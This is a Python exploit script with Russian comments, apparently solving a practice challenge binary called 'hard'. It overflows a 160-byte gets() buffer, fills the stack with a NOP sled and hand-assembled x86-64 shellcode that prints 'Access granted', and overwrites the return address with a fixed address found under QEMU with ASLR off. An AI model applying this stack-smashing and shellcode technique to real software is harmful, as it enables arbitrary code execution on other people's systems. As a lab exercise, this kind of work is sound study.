import struct
import subprocess


# Машинный код выполняет write(1, message, 14), затем exit(0).
# Адрес message вычисляется относительно RIP, поэтому код не зависит от
# абсолютного адреса строки внутри самого shellcode.
# Начальные байты помещают 1 в RAX (номер write) и RDI (stdout), LEA находит
# текст; затем 14 помещается в RDX и syscall выводит сообщение. Вторая часть
# задаёт номер exit и код возврата 0, после чего выполняет второй syscall.
shellcode = (
    bytes.fromhex("6a01586a015f488d350c0000006a0e5a0f056a3c5831ff0f05")
    + b"Access granted"
)

# В start_level gets заполняет локальный буфер размером 160 байт.
# Затем в стеке сохранённый RBP, поэтому смещение до RIP равно 168 байтам.
# NOP sled (0x90) даёт диапазон адресов для входа: процесс проходит по NOP
# инструкциям и доходит до shellcode. Адрес возврата записывается в little-endian.
# Адрес 0xfffff71eecd0 наблюдался при запуске setarch aarch64 -R под QEMU;
# это значение специфично для использованной среды.
# Для выполнения кода со стека в hard заранее включён флаг executable stack
# согласно readme_hard.txt (в этой системе это было сделано через patchelf).
payload = b"\x90" * 128 + shellcode
payload += b"A" * (168 - len(payload))
payload += struct.pack("<Q", 0xFFFFF71EECD0)
payload += b"\n"

subprocess.run(
    [
        # Запускаем x86-64 ELF и штатный загрузчик.
        "setarch",
        "aarch64",
        "-R",
        "qemu-amd64",
        "-L",
        "/",
        "/lib64/ld-linux-x86-64.so.2",
        "./hard",
    ],
    input=payload,
    # Shellcode вызывает exit(0); при несовпадении адреса возможен аварийный выход.
    check=False,
)
